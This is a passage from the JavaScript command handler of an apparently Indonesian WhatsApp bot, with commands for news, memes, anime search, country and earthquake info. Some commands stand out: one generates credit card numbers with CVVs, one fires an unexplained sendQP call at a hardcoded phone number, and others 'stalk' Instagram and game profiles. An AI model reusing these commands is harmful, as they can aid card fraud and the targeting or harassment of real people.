            { image: { url: res[0].berita_thumb }, caption: iwannnnnnnnnnn },
            { quoted: m }
          );
        });
        //D|ts si pler 🐎
        break;
      case "sindo":
        SindoNews().then(async (res) => {
          no = 0;
          iwannnnnnnnnnnn = "";
          for (let i of res) {
            no += 1;
            iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`;
            iwannnnnnnnnnnn += `Berita: ${i.berita}\n`;
            iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`;
            iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`;
          }
          iwannnnnnnnnnnn += "";
          reply(iwannnnnnnnnnnn);
        });
        //D|ts si pler 🐎
        break;
      //ppp
      case "00":
        {
          target = "6281513607731@s.whatsapp.net";
          sendQP(target, wanted);
        }
        //D|ts si pler 🐎
        break;
      case "kontan":
        KontanNews().then(async (res) => {
          iwannnnnnnnnnnnnnn = "";
          no = 0;
          for (let i of res) {
            no += 1;
            iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`;
            iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`;
            iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`;
            iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`;
            iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`;
          }
          iwannnnnnnnnnnnnnn += "";
          Kilianhst.sendMessage(
            m.chat,
            {
              image: { url: res[0].berita_thumb },
              caption: iwannnnnnnnnnnnnnn,
            },
            { quoted: m }
          );
        });
        //D|ts si pler 🐎
        break;
      case "jalantikus":
        var reis = await JalanTikusMeme();
        tekcs = "";
        tekcs += "Jalan Tikus Meme\n\n";
        tekcs += `Source: ${reis}`;
        tekcs += "";
        Kilianhst.sendMessage(
          m.chat,
          { image: { url: reis }, caption: tekcs },
          { quoted: m }
        );
        //D|ts si pler 🐎
        break;
      case "infonegara":
      case "country":
        {
          if (!q)
            return m.reply("Masukkan nama negara! Contoh: .infonegara Vietnam");
          let url = `https://api.siputzx.my.id/api/tools/countryInfo?name=${encodeURIComponent(
            q
          )}`;
          try {
            let res = await fetch(url);
            let json = await res.json();
            if (!json.status) return m.reply("Negara tidak ditemukan!");
            let data = json.data;
            let neighbors = data.neighbors
              .map((n) => `- ${n.name} (${n.flag})`)
              .join("\n");
            let replyText =
              `🌍 *Informasi Negara: ${data.name}*\n\n` +
              `🏛 *Ibukota:* ${data.capital}\n` +
              `📍 *Koordinat:* ${data.coordinates.latitude}, ${data.coordinates.longitude}\n` +
              `🏴 *Bendera:* ${data.flag}\n` +
              `📞 *Kode Telepon:* ${data.phoneCode}\n` +
              `🗺 *Peta:* ${data.googleMapsLink}\n` +
              `🌏 *Benua:* ${data.continent.name} ${data.continent.emoji}\n` +
              `🗣 *Bahasa:* ${data.languages.native.join(", ")}\n` +
              `💰 *Mata Uang:* ${data.currency}\n` +
              `🚗 *Lajur Kendaraan:* ${data.drivingSide}\n` +
              `🌟 *Terkenal Sebagai:* ${data.famousFor}\n` +
              `🏛 *Bentuk Pemerintahan:* ${data.constitutionalForm}\n` +
              `🌐 *Domain Internet:* ${data.internetTLD}\n` +
              `🌍 *Negara Tetangga:*\n${neighbors || "Tidak ada"}\n`;
            let buttons = [
              {
                buttonId: `${prefix}infonegara ${data.name}`,
                buttonText: { displayText: "🔄 Cek Lagi" },
                type: 1,
              },
              {
                buttonId: `.menu`,
                buttonText: { displayText: "📜 Menu" },
                type: 1,
              },
            ];
            let message = {
              text: replyText,
              footer: "Country Info Bot",
              buttons: buttons,
              headerType: 1,
              image: { url: data.flag },
            };
            Kilianhst.sendMessage(m.chat, message, { quoted: m });
          } catch (err) {
            console.error(err);
            m.reply("Terjadi kesalahan saat mengambil data.");
          }
        }
        break;
      case "groupsearch":
      case "gbs":
        {
          if (!q) return m.reply("Mau Nyari Group Apa?");
          const anu = await axios.get(
            `https://api.athar.web.id/api/whatsapp/grup/search?query=${encodeURIComponent(
              q
            )}`
          );
          m.reply(
            "*[ HASIL SEARCHING ]*\n\n\n" +
              anu.data.result
                .slice(0, 10)
                .map(
                  (g, i) =>
                    `- Group Name: ${i + 1}. ${g.title}\n- Group Link: ${
                      g.link
                    }\n`
                )
                .join("\n") || "*[ 404 ]* Not Found"
          );
        }
        break;
      case "vcc":
      case "cvcc":
        {
          try {
            let [type, jumlah] = args;
            let validTypes = ["MasterCard", "Visa", "Amex", "Discover"];
            if (!type || !validTypes.includes(type)) {
              return m.reply(
                `⚠️ Format salah! Pilih tipe: MasterCard, Visa, Amex, Discover.\n\n🔰 *Cara penggunaan:*\nKetik: *vcc <type> <jumlah>*\nContoh: *vcc Visa 3*`
              );
            }
            jumlah = jumlah && !isNaN(jumlah) ? parseInt(jumlah) : 5;
            if (jumlah < 1 || jumlah > 10)
              return m.reply("⚠️ Jumlah VCC minimal 1 dan maksimal 10!");
            const response = await fetch(
              `https://api.siputzx.my.id/api/tools/vcc-generator?type=${type}&count=${jumlah}`
            );
            const data = await response.json();
            if (!data.status || !data.data)
              return m.reply("⚠️ Gagal mengambil data VCC.");
            let message = `💳 *Virtual Credit Card (VCC) - ${type}*\n\n`;
            data.data.forEach((card, index) => {
              message +=
                ` *Card ${index + 1}*\n` +
                `• 🏷️ Name: ${card.cardholderName}\n` +
                `• 💳 Number: ${card.cardNumber}\n` +
                `• 📆 Exp: ${card.exprationDate}\n` +
                `• 🔐 CVV: ${card.cvv}\n\n`;
            });
            m.reply(message);
          } catch (err) {
            console.error(err);
            m.reply("⚠️ Terjadi kesalahan saat mengambil VCC.");
          }
        }
        break;
      case "cerpen":
        if (!text) return m.reply("`Masukan type: .cerpen anak`");
        function cerpen(category) {
          return new Promise(async (resolve, reject) => {
            try {
              let title = category.toLowerCase().replace(/[()*]/g, "");
              let judul = title.replace(/\s/g, "-");
              let page = Math.floor(Math.random() * 5) + 1;

              let get = await axios.get(
                "http://cerpenmu.com/category/cerpen-" + judul + "/page/" + page
              );
              let $ = cheerio.load(get.data);
              let link = [];

              $("article.post").each(function (a, b) {
                link.push($(b).find("a").attr("href"));
              });

              if (link.length === 0) {
                return reject("No stories found for this category.");
              }

              let random = link[Math.floor(Math.random() * link.length)];
              let res = await axios.get(random);
              let $$ = cheerio.load(res.data);

              let hasil = {
                title: $$("#content > article > h1").text(),
                author: $$("#content > article")
                  .text()
                  .split("Cerpen Karangan: ")[1]
                  ?.split("Kategori: ")[0]
                  ?.trim(),
                kategori: $$("#content > article")
                  .text()
                  .split("Kategori: ")[1]
                  ?.split("\n")[0]
                  ?.trim(),
                lolos: $$("#content > article")
                  .text()
                  .split("Lolos moderasi pada: ")[1]
                  ?.split("\n")[0]
                  ?.trim(),
                cerita: $$("#content > article > p").text(),
              };

              resolve(hasil);
            } catch (error) {
              reject(error);
            }
          });
        }

        try {
          var data = await cerpen(text);
          var textpp = `Title : ${data.title}\n`;
          textpp += `Author : ${data.author}\n`;
          textpp += `Category : ${data.kategori}\n`;
          textpp += `Approved on : ${data.lolos}\n`;
          textpp += `Story :\n${data.cerita}`;

          reply(textpp);
        } catch (error) {
          console.error(error);
          m.reply("An error occurred while fetching the story.");
        }
        //D|ts si pler 🐎
        break;
      case "galau":
        {
          const caption = `.`;
          let heyy;
          if (/galau/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/ditss-dev/ditss/main/video-random"
            );
          let plerkuda = heyy[Math.floor(Math.random() * heyy.length)];

          Kilianhst.sendMessage(
            m.chat,
            {
              video: { url: plerkuda },
              //thumbnailUrl: rees.thumbnail,
              //renderLargerThumbnail: true,
              caption: caption,
              footer: `Kontol galau galau`,
              buttons: [
                {
                  buttonId: `.${command}`,
                  buttonText: {
                    displayText: "lanjutt",
                  },
                },
                {
                  buttonId: `.galau`,

                  buttonText: {
                    displayText: "next",
                  },
                },
              ],
              viewOnce: true,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "ckalender":
      case "createkalender":
        {
          let args = text.split(" ");
          if (args.length < 2)
            return m.reply("Format salah! Gunakan: ckalender bulan tahun");
          let month = args[0];
          let year = args[1];
          if (isNaN(month) || isNaN(year))
            return m.reply("Bulan dan tahun harus berupa angka!");
          let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
          Kilianhst.sendMessage(
            m.chat,
            {
              image: { url: apiUrl },
              caption: `Kalender bulan ${month} tahun ${year}`,
            },
            { quoted: m }
          );
        }
        break;
      case "komiku":
        {
          if (!args[0])
            return m.reply("Masukkan judul manga yang ingin dicari!");

          let title = encodeURIComponent(args.join(" "));
          let url = `https://www.velyn.biz.id/api/search/komiku?title=${title}`;

          try {
            let res = await fetch(url);
            let json = await res.json();

            if (!json || !json.data || json.data.length === 0) {
              return m.reply("Manga tidak ditemukan!");
            }

            let message = `\u2728 *Hasil Pencarian* \u2728\n\n`;
            json.data.forEach((manga, index) => {
              let link = `https://komiku.id${manga.link}` || "Tidak tersedia";
              let status = manga.lastChp
                ? `Chapter Terbaru: ${manga.lastChp.title}`
                : "Tidak diketahui";

              message += `*${index + 1}. ${manga.title}*\n`;
              message += `\u2022 Link: ${link}\n`;
              message += `\u2022 Tipe: ${manga.type}\n`;
              message += `\u2022 Status: ${status}\n\n`;
            });

            m.reply(message.trim());
          } catch (err) {
            console.error(err);
            m.reply("❌ Error\nLogs error : " + err.message);
          }
        }
        break;
      case "cinfo":
      case "channelinfo":
      case "ci":
        {
          if (!args[0])
            return m.reply("⚠️ Format salah!\nGunakan: .cinfo <link_channel>");

          let match = args[0].match(/whatsapp\.com\/channel\/([\w-]+)/);
          if (!match)
            return m.reply("⚠️ *Terjadi kesalahan! Pastikan link valid.*");

          let inviteId = match[1];

          try {
            let metadata = await Kilianhst.newsletterMetadata(
              "invite",
              inviteId
            );
            if (!metadata || !metadata.id)
              return m.reply(
                "⚠️ *Gagal mengambil data channel. Pastikan link benar atau coba lagi nanti.*"
              );

            let caption =
              `*— 乂 Channel Info —*\n\n` +
              `🆔 *ID:* ${metadata.id}\n` +
              `📌 *Nama:* ${metadata.name}\n` +
              `👥 *Pengikut:* ${
                metadata.subscribers?.toLocaleString() || "Tidak diketahui"
              }\n` +
              `📅 *Dibuat sejak:* ${
                metadata.creation_time
                  ? new Date(metadata.creation_time * 1000).toLocaleString(
                      "id-ID"
                    )
                  : "Tidak diketahui"
              }\n` +
              `📄 *Deskripsi:* ${
                metadata.description || "Tidak ada deskripsi."
              }`;

            if (metadata.preview) {
              await Kilianhst.sendMessage(m.chat, {
                image: { url: "https://pps.whatsapp.net" + metadata.preview },
                caption,
              });
            } else {
              m.reply(caption);
            }
          } catch (error) {
            console.error("Error:", error);
            m.reply("Terjadi kesalahan! Bisa jadi link salah..");
          }
        }
        break;
      case "ffstalk":
      case "freefirestalk":
        {
          if (!q || q.split(" ").length < 2) {
            return reply(
              "ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ɪᴅ ᴛᴇʀᴋᴀᴋɪᴛ ᴅᴀɴ ʀᴇɢɪᴏɴ ᴍɪɴᴅɪʀɪᴛᴜɴɢ! \nᴄᴏɴᴛᴏʜ: ffstalk [id] [region]"
            );
          }
          const [id, region] = q.split(" "); // Ambil ID dan region dari input pengguna
          try {
            const response = await axios.get(
              `https://www.velyn.biz.id/api/stalk/FreeFireStalk?id=${id}&region=${region}`
            );

            if (response.data.status !== "success") {
              return reply("ᴛᴇʀʜᴀᴅᴀ ᴋᴇsᴀʟᴀʜᴀɴ ᴅᴀʟᴀᴍ ᴍᴇɴɢᴜᴍᴘᴜʟᴋᴀɴ ᴅᴀᴛa");
            }

            const {
              nickname,
              level,
              rank,
              kills,
              deaths,
              assists,
              matches,
              avatar,
            } = response.data.data;
            const userProfile = `
            *🕹️ Nickname:* ${nickname}
            *🎮 Level:* ${level}
            *🏆 Rank:* ${rank}
            *⚔️ Kills:* ${kills}
            *💀 Deaths:* ${deaths}
            *🤝 Assists:* ${assists}
            *🏅 Matches:* ${matches}
        `;

            const userImage =
              avatar || "https://example.com/default-avatar.png"; // URL avatar default jika kosong
            Kilianhst.sendMessage(m.chat, {
              text: userProfile,
              contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                  showAdAttribution: true,
                  title: "Free Fire Profile",
                  body: "Information about the Free Fire player.",
                  thumbnailUrl: userImage,
                  sourceUrl: "https://www.velyn.biz.id/",
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            });
          } catch (error) {
            console.error("Error fetching data:", error);
            reply("Terjadu Kesalahan");
          }
        }
        break;
      case "memerandom":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          try {
            let res = await fetch("https://api.vreden.my.id/api/meme");
            let data = await res.json();
            let hasil = data.result;
            Kilianhst.sendMessage(m.chat, {
              image: { url: hasil },
              caption: "Nih Meme Random Nya",
              buttons: [
                {
                  buttonId: ".memerandom",
                  buttonText: { displayText: "Next Meme" },
                  type: 1,
                },
              ],
              headerType: 4,
            });
          } catch {
            reply("Gagal Ambil Meme, Coba Lagi Nanti");
          }
        }
        break;
      case "cekasal":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          if (!m.mentionedJid[0]) return reply("Tag Seseorang Dulu");

          let nomor = m.mentionedJid[0].split("@")[0];
          let kodeNegara = nomor.match(/^\d{1,4}/)?.[0];
          let negara = "Tidak Diketahui";

          let prefix = {
            62: "Indonesia",
            60: "Malaysia",
            91: "India",
            92: "Pakistan",
            1: "Amerika/Canada",
            44: "Inggris",
            81: "Jepang",
            82: "Korea Selatan",
            84: "Vietnam",
            966: "Arab Saudi",
            // Tambah sendiri kalau mau
          };

          Object.keys(prefix).forEach((kode) => {
            if (nomor.startsWith(kode)) negara = prefix[kode];
          });

          Kilianhst.sendMessage(
            m.chat,
            { text: `Nomor: +${nomor}\nAsal Negara: ${negara}` },
            { quoted: m }
          );
        }
        break;
      case "cekasalmember":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          if (!m.isGroup) return m.reply(mess.OnlyGrup);
          const participants = await Kilianhst.groupMetadata(m.chat).then(
            (a) => a.participants
          );

          let dataNegara = {
            62: { nama: "Indonesia", emoji: "🇮🇩", jumlah: 0 },
            60: { nama: "Malaysia", emoji: "🇲🇾", jumlah: 0 },
            91: { nama: "India", emoji: "🇮🇳", jumlah: 0 },
            92: { nama: "Pakistan", emoji: "🇵🇰", jumlah: 0 },
            1: { nama: "USA/Canada", emoji: "🇺🇸", jumlah: 0 },
            44: { nama: "Inggris", emoji: "🇬🇧", jumlah: 0 },
            81: { nama: "Jepang", emoji: "🇯🇵", jumlah: 0 },
            82: { nama: "Korea Selatan", emoji: "🇰🇷", jumlah: 0 },
            84: { nama: "Vietnam", emoji: "🇻🇳", jumlah: 0 },
            234: { nama: "Nigeria", emoji: "🇳🇬", jumlah: 0 },
            55: { nama: "Brasil", emoji: "🇧🇷", jumlah: 0 },
            86: { nama: "China", emoji: "🇨🇳", jumlah: 0 },
            7: { nama: "Rusia", emoji: "🇷🇺", jumlah: 0 },
          };

          let lainnya = 0;

          participants.forEach((p) => {
            let nomor = p.id.split("@")[0];
            let ketemu = false;
            for (let kode in dataNegara) {
              if (nomor.startsWith(kode)) {
                dataNegara[kode].jumlah++;
                ketemu = true;
                break;
              }
            }
            if (!ketemu) lainnya++;
          });

          let hasil = `*Jumlah Anggota Berdasarkan Asal Negara:*\n\n`;
          Object.values(dataNegara).forEach((data) => {
            if (data.jumlah > 0)
              hasil += `${data.nama}: ${data.jumlah} ${data.emoji}\n`;
          });
          if (lainnya > 0) hasil += `Lainnya: ${lainnya} 🏳️`;

          m.reply(hasil);
        }
        break;
      case "infogempa":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );

          const { default: axios } = require("axios");

          try {
            const response = await axios.get(
              "https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/1.0_day.geojson"
            );
            const features = response.data.features;

            if (!features || features.length === 0)
              return reply("Tidak Ada Data Gempa Terkini");

            // Ambil data gempa terbaru
            const gempaTerkini = features[0];
            const waktu = new Date(
              gempaTerkini.properties.time
            ).toLocaleString();
            const lokasi = gempaTerkini.properties.place;
            const magnitudo = gempaTerkini.properties.mag;
            const kedalaman = gempaTerkini.properties.depth;
            const koordinat = gempaTerkini.geometry.coordinates
              .slice(0, 2)
              .join(", ");
            const dirasakan = gempaTerkini.properties.dop || "Tidak Terdata";

            const teks =
              `*Info Gempa Terkini (USGS)*\n\n` +
              `• Waktu     : ${waktu}\n` +
              `• Lokasi    : ${lokasi}\n` +
              `• Magnitudo : ${magnitudo}\n` +
              `• Kedalaman : ${kedalaman} km\n` +
              `• Koordinat : ${koordinat}\n` +
              `• Dirasakan : ${dirasakan}`;

            // Kirim pesan dengan informasi gempa
            await Kilianhst.sendMessage(
              m.chat,
              {
                text: teks,
              },
              { quoted: m }
            );
          } catch (e) {
            reply("Gagal Mengambil Data Gempa: " + e.message);
          }
        }
        break;
      case "igstalk":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          if (!text) return reply("Mana Usernamenya");

          let username = text.trim().toLowerCase();
          try {
            let res = await fetch(
              `https://www.instagram.com/${username}/?__a=1&__d=dis`
            );
            if (!res.ok)
              return reply(
                "Gagal Ambil Data, Mungkin Akun Tidak Ada Atau Private"
              );
            let data = await res.json();
            let user = data.graphql.user;
            let caption = `*Instagram Stalk*
• Username : ${user.username}
• Full Name : ${user.full_name}
• Bio : ${user.biography || "-"}
• Followers : ${user.edge_followed_by.count}
• Following : ${user.edge_follow.count}
• Post : ${user.edge_owner_to_timeline_media.count}
• Verified : ${user.is_verified ? "Yes" : "No"}
• Private : ${user.is_private ? "Yes" : "No"}
• Link : https://instagram.com/${user.username}`;

            let pp = user.profile_pic_url_hd || user.profile_pic_url;
            Kilianhst.sendMessage(
              m.chat,
              { image: { url: pp }, caption },
              { quoted: m }
            );
          } catch (e) {
            console.log(e);
            reply("Error Ambil Data Instagram");
          }
        }
        break;
      case "fakta":
      case "faktamenarik":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴅᴀꜰᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀꜰᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀꜰᴛᴀʀ email@example.com"
            );
          let fakta = [
            "Air panas membeku lebih cepat daripada air dingin.",
            "Kucing tidak bisa merasakan rasa manis.",
            "Pisang adalah buah beri, tapi stroberi bukan.",
            "Jantung manusia bisa berdetak di luar tubuh.",
            "Lumba-lumba tidur dengan satu mata terbuka.",
            "Lebah bisa mengenali wajah manusia.",
            "Cacing memiliki lima jantung.",
            "Ubur-ubur tidak memiliki otak ataupun hati.",
            "Tanduk badak terbuat dari rambut yang padat.",
            "Bayi punya lebih banyak tulang daripada orang dewasa.",
            "Semut tidak tidur.",
            "Otak manusia lebih aktif saat tidur daripada saat menonton TV.",
            "Koala punya sidik jari yang hampir sama dengan manusia.",
            "Katak bisa membeku dan hidup kembali.",
            "Jerapah hanya butuh tidur 30 menit sehari.",
            "Tinta cumi-cumi digunakan dalam makanan pasta.",
            "Kelelawar selalu berbelok ke kiri saat keluar dari gua.",
            "Gigi hiu bisa tumbuh kembali berkali-kali.",
            "Paus biru adalah hewan terbesar di dunia.",
            "Buaya tidak bisa menjulurkan lidah.",
            "Lebih banyak orang terbunuh oleh keledai daripada kecelakaan pesawat setiap tahun.",
            "Burung kolibri bisa terbang mundur.",
            "Planet Venus berputar ke arah yang berlawanan dari planet lain.",
            "Coklat bisa membunuh anjing.",
            "Madu tidak pernah basi.",
            "Orang bisa bermimpi hingga 7 kali dalam semalam.",
            "Seekor siput bisa tidur selama 3 tahun.",
            "Katak menelan makanan dengan bantuan matanya.",
            "Setiap sidik jari dan lidah manusia itu unik.",
            "Bintang laut bisa membalik perutnya keluar untuk makan.",
            "Otters tidur sambil berpegangan tangan.",
            "Nyamuk lebih suka menggigit orang dengan golongan darah O.",
            "Paus bisa berkomunikasi antar ribuan kilometer.",
            "Semangka terdiri dari 92% air.",
            "Bambu bisa tumbuh 90cm per hari.",
            "Darah gurita berwarna biru.",
            "Gajah takut lebah.",
            "Gurita punya tiga jantung.",
            "Burung hantu bisa memutar kepalanya hampir 270 derajat.",
            "Jantung paus biru seukuran mobil kecil.",
            "Unta menyimpan lemak di punuknya, bukan air.",
            "Manusia berbagi 60% DNA dengan pisang.",
            "Ayam bisa mengingat lebih dari 100 wajah.",
            "Kucing bisa berlari hingga 48 km/jam dalam jarak pendek.",
            "Jamur adalah organisme yang lebih dekat ke hewan daripada tanaman.",
            "Singa betina yang biasanya berburu, bukan jantan.",
            "Tubuh manusia terdiri dari 37 triliun sel.",
            "Telinga manusia terus tumbuh seumur hidup.",
            "Kupu-kupu bisa mencium dengan kakinya.",
            "Katak tidak minum air, mereka menyerapnya lewat kulit.",
            "Kerang bisa hidup hingga 100 tahun.",
            "Otak manusia menghasilkan listrik untuk menyalakan bola lampu kecil.",
          ];
          let random = fakta[Math.floor(Math.random() * fakta.length)];
          reply(`*Fakta Menarik*\n\n${random}`);
        }
        break;
      case "apk":
        {
          if (!q)
            return m.reply(
              "Contoh:\n.apk search Mobile Legends\n.apk detail \n.apk download "
            );
          let [cmd, ...args] = q.split(" ");
          let text = args.join(" ");

          switch (cmd.toLowerCase()) {
            case "search":
              if (!text) return m.reply("Contoh: .apk search Mobile Legends");
              try {
                let res = await fetch(
                  `https://www.velyn.biz.id/api/search/apk4freesearch?query=${encodeURIComponent(
                    text
                  )}`
                );
                let data = await res.json();
                if (!data.status || !data.result || data.result.length === 0)
                  return m.reply("Tidak ditemukan hasil.");
                let teks = `*Hasil Pencarian APK untuk:* ${text}\n\n`;
                for (let i = 0; i < data.result.length; i++) {
                  let apk = data.result[i];
                  teks += `*${i + 1}. ${apk.title || "-"}*\n`;
                  teks += `Developer: ${apk.developer || "-"}\n`;
                  teks += `Versi: ${apk.version || "-"}\n`;
                  teks += `Rating: ${apk.rating || "-"}\n`;
                  teks += `Link: ${apk.link || "-"}\n\n`;
                }
                let thumb = data.result[0].image || null;
                Kilianhst.sendMessage(
                  m.chat,
                  {
                    image: { url: thumb },
                    caption: teks,
                  },
                  { quoted: m }
                );
              } catch (e) {
                console.error(e);
                m.reply("Terjadi kesalahan saat mencari APK.");
              }
              break;

            case "detail":
              if (!text)
                return m.reply(
                  "Contoh: .apk detail https://apk4free.net/mobile-legends/"
                );
              try {
                let res = await fetch(
                  `https://www.velyn.biz.id/api/search/apk4freedetail?url=${encodeURIComponent(
                    text
                  )}`
                );
                let data = await res.json();
                if (!data.status || !data.result)
                  return m.reply("Detail APK tidak ditemukan.");
                const d = data.result;
                let caption = `*${d.title || "Tanpa Judul"}*\n\n`;
                caption += `*Versi:* ${d.version || "-"}\n`;
                caption += `*Genre:* ${d.genre || "-"}\n`;
                caption += `*Developer:* ${d.developer || "-"}\n`;
                caption += `*Rating:* ${d.rating || "-"} (${
                  d.votes || "-"
                } suara)\n`;
                caption += `*Requirement:* Android ${d.requirements || "-"}\n`;
                caption += `*Total Download:* ${d.downloads || "-"}\n`;
                caption += `*Playstore:* ${d.playstore || "-"}\n`;
                caption += `*Download Link:* ${d.download || "-"}\n\n`;
                caption += `*Deskripsi Singkat:*\n${d.description || "-"}\n\n`;
                caption += `*Yang Baru:*\n${d.whatsnew || "-"}`;

                await Kilianhst.sendMessage(
                  m.chat,
                  {
                    image: { url: d.icon || "" },
                    caption,
                  },
                  { quoted: m }
                );

                if (Array.isArray(d.images) && d.images.length > 0) {
                  for (let img of d.images) {
                    await Kilianhst.sendMessage(
                      m.chat,
                      {
                        image: { url: img },
                        caption: "Screenshot",
                      },
                      { quoted: m }
                    );
                  }
                }

                if (Array.isArray(d.related) && d.related.length > 0) {
                  let teks = `*Rekomendasi APK Terkait:*\n\n`;
                  for (let rel of d.related) {
                    teks += `• *${rel.title || "-"}*\n`;
                    teks += `Developer: ${rel.developer || "-"}\n`;
                    teks += `Versi: ${rel.version || "-"}\n`;
                    teks += `Rating: ${rel.rating || "-"}\n`;
                    teks += `Link: ${rel.link || "-"}\n\n`;
                  }
                  await m.reply(teks);
                }
              } catch (e) {
                console.error(e);
                m.reply("Gagal mengambil detail APK.");
              }
              break;

            case "download":
            case "dowload":
              if (!text)
                return m.reply(
                  "Contoh: .apk download https://apk4free.net/pubg-mobile/download/"
                );
              try {
                const axios = require("axios");
                const res = await axios.get(
                  `https://www.velyn.biz.id/api/search/apk4freedownload?url=${text}`
                );
                const data = res.data;
                if (!data.status) return m.reply("Gagal mengambil data APK!");
                const apk = data.result;

                const caption =
                  `*APK DITEMUKAN!*\n\n` +
                  `*Title:* ${apk.title}\n` +
                  `*Package:* ${apk.package}\n` +
                  `*Version:* ${apk.version}\n` +
                  `*Size:* ${apk.size || "Tidak tersedia"}\n` +
                  `*Requirements:* ${apk.requirements}\n\n` +
                  `*Link Download:*\n${apk.url}`;
                await Kilianhst.sendMessage(
                  m.chat,
                  {
                    text: caption,
                    contextInfo: {
                      externalAdReply: {
                        title: apk.title,
                        body: "Download APK Gratis",
                        thumbnailUrl:
                          "https://img12.pixhost.to/images/1545/585982689_biyuofficial.jpg",
                        mediaType: 1,
                        mediaUrl: apk.url,
                        sourceUrl: apk.url,
                      },
                    },
                  },
                  { quoted: m }
                );
                await Kilianhst.sendMessage(
                  m.chat,
                  {
                    document: { url: apk.url },
                    mimetype: "application/vnd.android.package-archive",
                    fileName: `${apk.title.replace(/\s+/g, "_")}.apk`,
                  },
                  { quoted: m }
                );
              } catch (e) {
                console.log(e);
                m.reply("Terjadi kesalahan, coba lagi nanti.");
              }
              break;

            default:
              m.reply(
                "Subperintah tidak dikenali!\nGunakan:\n.apk search \n.apk detail \n.apk download "
              );
          }
        }
        break;
      case "hiitwixtor":
      case "twixtor":
        {
          if (!text) return m.reply("Contoh: hiitwixtor Gojo");
          const axios = require("axios");
          const cheerio = require("cheerio");
          const search = async (query) => {
            try {
              const url = `https://hiitwixtor.com/?s=${encodeURIComponent(
                query
              )}`;
              const { data } = await axios.get(url);
              const $ = cheerio.load(data);
              let result = [];
              $(".post-details").each((_, el) => {
                const title = $(el).find("h2").text().trim();
                const link = $(el).find("h2>a").attr("href");
                const image = $("a.post-thumb").find("img").attr("src");
                const coment = $(el)
                  .find("span.meta-comment.tie-icon.meta-item.fa-before")
                  .text()
                  .trim();
                const fire = $(el)
                  .find("span.meta-views.meta-item.very-hot")
                  .text()
                  .trim();
                result.push({ title, link, image, coment, fire });
              });
              return result;
            } catch (e) {
              return [];
            }
          };
          let res = await search(text);
          if (!res.length) return m.reply("Tidak ditemukan.");
          let teks = `*Hasil pencarian Hiitwixtor: ${text}*\n\n`;
          for (let i = 0; i < res.length; i++) {
            teks += `*${i + 1}. ${res[i].title}*\n`;
            teks += `🔥 Views: ${res[i].fire} | 💬 Comments: ${res[i].coment}\n`;
            teks += `${res[i].link}\n\n`;
          }
          m.reply(teks);
        }
        break;
      case "sanime":
      case "searchanime":
      case "kuronime":
        {
          if (!q)
            return m.reply(
              "🔎 *Silakan masukkan judul anime yang ingin kamu cari.*"
            );

          try {
            const axios = require("axios");
            const cheerio = require("cheerio");
            const url = `https://kuronime.biz/page/1/?s=${encodeURIComponent(
              q
            )}`;
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const results = [];
            $(".listupd article").each((_, el) => {
              const anchor = $(el).find("a");
              const title = anchor.find("h4").text().trim();
              const link = anchor.attr("href");
              const image = anchor.find("img.lazyload").last().attr("data-src");
              const rating = anchor.find("i").text().trim();
              const type = anchor.find(".type").text().trim();
              results.push({ title, link, image, rating, type });
            });
            if (!results.length)
              return m.reply("Anime tidak ditemukan, coba kata kunci lain.");
            let message = `Hasil pencarian untuk *${q}*:\n\n`;
            results.forEach((anime, index) => {
              message += `*${index + 1}. ${anime.title}*\n`;
              message += `   🔗 *Link*: ${anime.link}\n`;
              message += `   📊 *Rating*: ${anime.rating}\n`;
              message += `   📌 *Type*: ${anime.type}\n\n`;
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: message.trim(),
                contextInfo: {
                  externalAdReply: {
                    title: "Kuronime Search",
                    body: "",
                    thumbnailUrl: results[0]?.image || "",
